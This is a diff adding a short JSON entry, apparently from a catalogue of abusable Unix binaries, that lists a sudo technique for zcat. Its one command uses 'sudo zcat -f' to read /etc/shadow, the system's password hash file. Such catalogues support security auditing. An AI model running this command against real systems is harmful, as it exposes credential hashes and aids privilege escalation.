@@ -1,0 +1,10 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "",
+        "code": "LFILE=\"/etc/shadow\" # or any other file\nsudo zcat -f \"$LFILE\"\n"
+      }
+    ]
+  }
+}
